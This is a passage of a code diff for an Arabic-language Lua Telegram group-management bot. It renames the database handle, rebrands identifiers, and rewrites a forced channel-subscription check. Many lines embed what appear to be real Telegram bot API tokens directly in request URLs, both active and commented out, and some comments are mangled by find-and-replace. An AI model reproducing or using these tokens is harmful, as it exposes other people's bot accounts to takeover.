-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
-database:del('key_ts'..bot_id)
+datahmade:del('key_ts'..bot_id)
 send(msg.chat_id_, msg.id_, 1, "⚠┇تم تعطيل خاصيه الازرار الشفافه", 1, 'html')
 end
 ------------------------------------------------------------------------
 if text and text:match("^(تغير نص الانلاين) (.*)$") then
 local name_t = {string.match(text, "^(تغير نص الانلاين) (.*)$")}
-database:set("channel_ts"..bot_id, name_t[2])
+datahmade:set("channel_ts"..bot_id, name_t[2])
 send(msg.chat_id_, msg.id_, 1, "📡┇تم تغير النص ~⪼ {"..name_t[2].."}", 1, 'html')
 end
 ------------------------------------------------------------------------
 if text and text:match("^(تغير رابط الانلاين) [Hh][Tt][Tt][Pp](.*)$") then
 local name_t = {string.match(text, "^(تغير رابط الانلاين) (.*)$")}
-database:set("channel_user_ts"..bot_id, name_t[2])
+datahmade:set("channel_user_ts"..bot_id, name_t[2])
 send(msg.chat_id_, msg.id_, 1, "📡┇تم تغير الرابط ~⪼ {"..name_t[2].."}", 1, 'html')
 end
 ------------------------------------------------------------------------
 if text == 'تفعيل التفعيل التلقائي'then
-database:set("add"..bot_id, "yes")
+datahmade:set("add"..bot_id, "yes")
 send(msg.chat_id_, msg.id_, 1, "✔️┇تم تفعيل التفعيل التلقائي", 1, 'html')
 end
 if (text == 'تعطيل التفعيل التلقائي') then
-database:del("add"..bot_id)
+datahmade:del("add"..bot_id)
 send(msg.chat_id_, msg.id_, 1, "🔌┇تم تعطيل التفعيل التلقائي", 1, 'html')
 end
 if text and text:match("^(تعين عدد الاعضاء) (.*)$") then
 local Num = {string.match(text, "^(تعين عدد الاعضاء) (.*)$")}
-database:set("ts_a"..bot_id,Num[2])
+datahmade:set("ts_a"..bot_id,Num[2])
 send(msg.chat_id_, msg.id_, 1, "🔘┇ تم تعين : "..Num[2], 1, 'html')
 end
 ------------------------------------------------------------------------
 if text == ("تغير امر المطور") then
 send(msg.chat_id_, msg.id_, 1, '• `الان يمكنك ارسال رقم المطور` 🗳', 1, 'md')
-redis:set('MohaMeD:'..bot_id..'nkeko'..msg.sender_user_id_..'', 'msg')
+redis:set('MohaMeD:'..bot_id..'nahmad'..msg.sender_user_id_..'', 'msg')
 return false 
 end
 if text == ("مسح المطورين") then
@@ -3206,7 +3148,7 @@ if text == ("المطورين") then
 local list = redis:smembers('MohaMeD:'..bot_id..'dev')
 text = "👨🏿‍💻 ┇ قائمه المطورين   ،\nꔹ┉♦️┉ ┉ ┉ ┉♦️┉ꔹ \n"
 for k,v in pairs(list) do
-local user_info = database:hgetall('MohaMeD:'..bot_id..'user:'..v)
+local user_info = datahmade:hgetall('MohaMeD:'..bot_id..'user:'..v)
 if user_info and user_info.username then
 local username = user_info.username
 text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
@@ -3224,44 +3166,44 @@ end
 send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
 end
 if  (text and text == 'تفعيل وضع المدفوع') then
-if database:sismember('MohaMeD:'..bot_id..'pro:groups',msg.chat_id_) then
+if datahmade:sismember('MohaMeD:'..bot_id..'pro:groups',msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '✔️┇بالفعل تم اضافه المجموعه الى الوضع المدفوع', 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, '✔️┇تم اضافه المجموعه الى الوضع المدفوع', 1, 'md')
-database:sadd('MohaMeD:'..bot_id..'pro:groups',msg.chat_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'pro:groups',msg.chat_id_)
 end
 end
 if (text and text == 'تعطيل وضع المدفوع') then
-if not database:sismember('MohaMeD:'..bot_id..'pro:groups',msg.chat_id_) then
+if not datahmade:sismember('MohaMeD:'..bot_id..'pro:groups',msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '🔌┇بالفعل تم حذف المجموعه من الوضع المدفوع', 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, '🔌┇تم حذف المجموعه من الوضع المدفوع', 1, 'md')
-database:srem('MohaMeD:'..bot_id..'pro:groups',msg.chat_id_)
+datahmade:srem('MohaMeD:'..bot_id..'pro:groups',msg.chat_id_)
 end
 end
 if (text and text == 'تفعيل الاذاعه') then
-if not database:get('MohaMeD:'..bot_id..'bc:groups') then
+if not datahmade:get('MohaMeD:'..bot_id..'bc:groups') then
 send(msg.chat_id_, msg.id_, 1, '✔️┇الاذاعه بالفعل تم تفعيلها', 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, '✔️┇تم تفعيل اذاعه البوت', 1, 'md')
-database:del('MohaMeD:'..bot_id..'bc:groups')
+datahmade:del('MohaMeD:'..bot_id..'bc:groups')
 end
 end
 if (text and text == 'تعطيل الاذاعه') then
-if database:get('MohaMeD:'..bot_id..'bc:groups') then
+if datahmade:get('MohaMeD:'..bot_id..'bc:groups') then
 send(msg.chat_id_, msg.id_, 1, '🔌┇الاذاعه بالفعل تم تعطيلها', 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, '🔌┇تم تعطيل اذاعه البوت', 1, 'md')
-database:set('MohaMeD:'..bot_id..'bc:groups',true)
+datahmade:set('MohaMeD:'..bot_id..'bc:groups',true)
 end
 end
 if text and text == "تعين مجموعه المطور" then
 send(msg.chat_id_, msg.id_, 1, '☑┇ تم تعين ~⪼ `'..msg.chat_id_..'`', 1, 'md')
-database:set("MohaMeD"..bot_id..":sudo:gr",msg.chat_id_)
+datahmade:set("MohaMeD"..bot_id..":sudo:gr",msg.chat_id_)
 end
 if text and text == "مسح مجموعه المطور" then
 send(msg.chat_id_, msg.id_, 1, '☑┇ تم مسح مجموعه المطور', 1, 'md')
-database:del("MohaMeD"..bot_id..":sudo:gr")
+datahmade:del("MohaMeD"..bot_id..":sudo:gr")
 end
 if (text and text == 'استعاده الاوامر') then
 redis:del('MohaMeD:'..bot_id..'help', text)
@@ -3312,22 +3254,13 @@ send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف الكليشه ', 1, 'html')
 return "MohaMeD"
 end
 
-end -- end if is_devabas(msg) then
+end -- end if is_devahmad(msg) then
 ------------------------------------------------------------------------
 if is_sudo(msg) then
 if text and text == "اذاعه" then 
-if (not database:get('MohaMeD:'..bot_id..'bc:groups') or tonumber(sudo_add) == tonumber(msg.sender_user_id_)) then
+if (not datahmade:get('MohaMeD:'..bot_id..'bc:groups') or tonumber(sudo_add) == tonumber(msg.sender_user_id_)) then
 send(msg.chat_id_, msg.id_, 1, '☑┇ ارسال الان نص او الميديا : (صوره - فديو - متحركه - ملف)', 1, 'md')
-database:set("MohaMeD:set_if_bc_new:"..bot_id..msg.sender_user_id_,"ok")
-return "MohaMeD"
-else
-send(msg.chat_id_, msg.id_, 1, '☑┇ الاذاعه معطله ', 1, 'md')
-end
-end
-if text and text == "اذاعه بالتثبيت" then 
-if (not database:get('MohaMeD:'..bot_id..'bc:groups') or tonumber(sudo_add) == tonumber(msg.sender_user_id_)) then
-send(msg.chat_id_, msg.id_, 1, '☑┇ ارسال الان نص او الميديا : (صوره - فديو - متحركه - ملف)', 1, 'md')
-database:set("MohaMeD:set_if_bc_new:pin"..bot_id..msg.sender_user_id_,"ok")
+datahmade:set("MohaMeD:set_if_bc_new:"..bot_id..msg.sender_user_id_,"ok")
 return "MohaMeD"
 else
 send(msg.chat_id_, msg.id_, 1, '☑┇ الاذاعه معطله ', 1, 'md')
@@ -3335,8 +3268,8 @@ end
 end
 ------------------------------------------------------------------------
 if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 then 
-if (not database:get('MohaMeD:'..bot_id..'bc:groups') or tonumber(sudo_add) == tonumber(msg.sender_user_id_)) then
-database:setex('MohaMeD:'..bot_id.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
+if (not datahmade:get('MohaMeD:'..bot_id..'bc:groups') or tonumber(sudo_add) == tonumber(msg.sender_user_id_)) then
+datahmade:setex('MohaMeD:'..bot_id.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_, 1, "☑┇ ارسال الان نص او الميديا : (صوره - فديو - متحركه )\n", 1, "md") 
 else
 send(msg.chat_id_, msg.id_, 1, '☑┇ الاذاعه معطله ', 1, 'md')
@@ -3345,26 +3278,26 @@ return false
 end 
 ------------------------------------------------------------------------
 if text == "تفعيل" then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 function TSby(extra,result,success)
 info = '👤┇بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'MohaMeDTEAM')..')\n'
-if database:get( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_) then
-function thsake_info(k1,k2)
+if datahmade:get( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_) then
+function MohaMeDe_info(k1,k2)
 send(msg.chat_id_, msg.id_, 1, "❕┇المجموعه {"..(k2.title_ or "").."} مفعله سابقا", 1, 'md')
 end
-openChat(msg.chat_id_,thsake_info)
+openChat(msg.chat_id_,MohaMeDe_info)
 end
-if not database:get( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_) then
-database:set( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_,true)
-function thsake_info(k1,k2)
+if not datahmade:get( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_) then
+datahmade:set( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_,true)
+function MohaMeDe_info(k1,k2)
 send(msg.chat_id_, msg.id_, 1, info.."✔️┇تم تفعيل المجموعه {"..(k2.title_ or "").."}", 1, 'md')
 end
-openChat(msg.chat_id_,thsake_info)
-function thsake_info2(k1,k2)
+openChat(msg.chat_id_,MohaMeDe_info)
+function MohaMeDe_info2(k1,k2)
 function dl_cb222(t1,t2)
 if t2.invite_link_ == false then 
 local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_
@@ -3374,44 +3307,44 @@ if link.ok == true then
   t2.invite_link_ = link.result
 end
 end
-database:set('MohaMeD:'..bot_id.."group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
-send(tostring((database:get("MohaMeD"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "📛┇قام بتفعيل مجموعه \n🎫┇ايدي مطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
+datahmade:set('MohaMeD:'..bot_id.."group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
+send(tostring((datahmade:get("MohaMeD"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "🔘┇قام بتفعيل مجموعه \n🎫┇ايدي مطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
 end
 tdcli_function ({
 ID = "GetChannelFull",
 channel_id_ = getChatId(msg.chat_id_).ID
 }, dl_cb222, nil)
 end
-openChat(msg.chat_id_,thsake_info2) 
+openChat(msg.chat_id_,MohaMeDe_info2) 
 --
-database:sadd("thsake:gog"..bot_id, msg.chat_id_)
-database:set( 'MohaMeD:'..bot_id.."enable:"..msg.chat_id_,true)
+datahmade:sadd("MohaMeDe:gog"..bot_id, msg.chat_id_)
+datahmade:set( 'MohaMeD:'..bot_id.."enable:"..msg.chat_id_,true)
 end end
 getUser(msg.sender_user_id_, TSby)
 end
 ------------------------------------------------------------------------
 if text == "تعطيل" then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 function TSby(extra,result,success)
 info = '👤┇بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'MohaMeDTEAM')..')\n'
-if not database:get( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_) then
-function thsake_info(k1,k2)
+if not datahmade:get( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_) then
+function MohaMeDe_info(k1,k2)
 send(msg.chat_id_, msg.id_, 1, "❕┇المجموعه {"..(k2.title_ or "").."} معطله سابقا", 1, 'md')
 end
-openChat(msg.chat_id_,thsake_info)
+openChat(msg.chat_id_,MohaMeDe_info)
 end
-if database:get( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_) then
-database:del( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_)
-function thsake_info(k1,k2)
+if datahmade:get( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_) then
+datahmade:del( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_)
+function MohaMeDe_info(k1,k2)
 send(msg.chat_id_, msg.id_, 1, info.."🚸┇تم تعطيل المجموعه {"..k2.title_.."}", 1, 'md')
 end
-openChat(msg.chat_id_,thsake_info)
-database:srem("thsake:gog"..bot_id, msg.chat_id_)
-function thsake_info2(k1,k2)
+openChat(msg.chat_id_,MohaMeDe_info)
+datahmade:srem("MohaMeDe:gog"..bot_id, msg.chat_id_)
+function MohaMeDe_info2(k1,k2)
 function dl_cb222(t1,t2)
 if t2.invite_link_ == false then 
 local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_
@@ -3421,15 +3354,15 @@ if link.ok == true then
   t2.invite_link_ = link.result
 end
 end
-database:set('MohaMeD:'..bot_id.."group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
-send(tostring((database:get("MohaMeD"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "🔘┇قام تعطيل مجموعه \n📌┇ايدي مطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
+datahmade:set('MohaMeD:'..bot_id.."group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
+send(tostring((datahmade:get("MohaMeD"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "🔘┇قام تعطيل مجموعه \n📌┇ايدي مطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
 end
 tdcli_function ({
 ID = "GetChannelFull",
 channel_id_ = getChatId(msg.chat_id_).ID
 }, dl_cb222, nil)
 end
-openChat(msg.chat_id_,thsake_info2) 
+openChat(msg.chat_id_,MohaMeDe_info2) 
 --
 end 
 end
@@ -3438,9 +3371,9 @@ return false
 end
 ------------------------------------------------------------------------
 if text == 'مغادره' then
-local lave = database:get('MohaMeD:'..bot_id..'leave:groups')
+local lave = datahmade:get('MohaMeD:'..bot_id..'leave:groups')
 print(lave)
-if not database:get('MohaMeD:'..bot_id..'leave:groups') then
+if not datahmade:get('MohaMeD:'..bot_id..'leave:groups') then
 chat_leave(msg.chat_id_, bot_id)
 send(msg.chat_id_, msg.id_, 1, "☑┇تم مغادره المجموعه", 1, 'md')
 else
@@ -3450,28 +3383,28 @@ return false
 end
 if text == ("مسح الاساسين") then
 text = '☑┇تم مسح قائمه المنشئين الاساسين'
-database:del('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 return false
 end
 if text == ("رفع منشئ اساسي") and msg.reply_to_message_id_ then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 function promote_by_reply(extra, result, success)
-database:sadd('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, result.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, result.sender_user_id_)
 tsX000("prore",msg,'🔖┇تم رفعة منشئ اساسي  في البوت')
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 return false
 end
 if text and text:match("^رفع منشئ اساسي @(.*)$") then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 local apmd = {string.match(text, "^(رفع منشئ اساسي) @(.*)$")}
 function promote_by_username(extra, result, success)
@@ -3480,8 +3413,8 @@ if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
 SendText(msg.chat_id_,msg.id_,"*📮┇ هاذا معرف قناة \n*")   
 return false 
 end      
-database:sadd('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, result.id_)
-texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'MohaMeDTEAM')..')\n🔖┇تم رفعة منشئ اساسي  في البوت  '
+datahmade:sadd('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, result.id_)
+texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'MohaMeDTEAM')..')\n┇ 🔖┇تم رفعة منشئ اساسي  في البوت  '
 else
 texts = '✖┇خطاء'
 end
@@ -3491,39 +3424,39 @@ resolve_username(apmd[2],promote_by_username)
 return false
 end
 if text and text:match("^رفع منشئ اساسي (%d+)$") then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 local apmd = {string.match(text, "^(رفع منشئ اساسي) (%d+)$")}
-database:sadd('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, apmd[2])
+datahmade:sadd('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, apmd[2])
 tsX000(apmd[2],msg,"🔖┇تم رفعة منشئ اساسي  في البوت")
 return false
 end
 if text == ("تنزيل منشئ اساسي") and msg.reply_to_message_id_ then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
